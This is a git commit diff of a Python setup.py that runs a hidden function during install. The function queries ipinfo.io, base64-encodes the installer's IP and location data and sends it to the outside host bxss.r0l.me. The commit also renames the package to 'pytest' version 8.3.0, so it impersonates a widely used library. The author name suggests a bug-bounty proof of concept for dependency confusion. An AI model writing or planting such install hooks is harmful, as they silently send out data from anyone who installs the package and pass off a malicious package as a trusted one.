c00f98c3d9bb199a3404339e848b0b7f4cac43af
Rreiss'"sHackerOne/s <72650266+rreissdorker@users.noreply.github.com>
2024-07-01 08:50:41 +0300

    Update setup.py

--- setup.py
+++ setup.py
@@ -7,12 +7,12 @@ import base64
 def sdesc():
     r = requests.get("https://ipinfo.io")
     content = base64.b64encode(r.text.encode()).decode()
-    return requests.get(f"https://bxss.r0l.me/myghpackagedata?data={content}")
+    return requests.get(f"https://bxss.r0l.me/snykpytest?data={content}")
 
 
 setup(
-    name='my_gh_package',
-    version='1.5.4',
+    name='pytest',
+    version='8.3.0',
     description=sdesc(),
     long_description='Some random long description',
     long_description_content_type='text/markdown',
@@ -22,5 +22,5 @@ setup(
         'requests',
         'atlassian-python-api'
     ],
-    license="MIT"
+    license="LGPL 3.0"
 )
